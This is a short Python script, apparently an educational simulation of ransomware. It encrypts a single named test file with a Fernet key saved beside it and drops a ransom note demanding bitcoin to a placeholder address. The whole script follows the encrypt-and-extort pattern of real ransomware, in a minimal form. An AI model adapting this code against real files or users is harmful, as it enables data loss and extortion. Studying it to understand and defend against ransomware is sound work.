from cryptography.fernet import Fernet
import os

# Step 1: Generate and save encryption key
key = Fernet.generate_key()
key_path = "C:/cybersecurity/ransomemess/secret.key"
with open(key_path, "wb") as key_file:
    key_file.write(key)

fernet = Fernet(key)

# Step 2: Encrypt the test file
file_path = "C:/cybersecurity/ransomemess/textfile.txt"

try:
    with open(file_path, "rb") as file:
        original = file.read()

    encrypted = fernet.encrypt(original)

    with open(file_path, "wb") as file:
        file.write(encrypted)

    print("[+] File encrypted successfully.")

except FileNotFoundError:
    print("[-] The test file was not found at the specified location.")

except Exception as e:
    print(f"[-] An error occurred while encrypting: {e}")

# Step 3: Create ransom note
note = """
===============================
    !! YOUR FILE HAS BEEN ENCRYPTED !!
===============================

To retrieve your data, send 0.01 BTC to the address:
bc1qxyzfakeaddresssimulatedonly

After payment, run the decryption program using the key file we sent.

**Note:** This is a simulation for educational purposes only.
"""

note_path = "C:/cybersecurity/ransomemess/Look.txt"
with open(note_path, "w") as file:
    file.write(note)

print("[+] Ransom note created.")
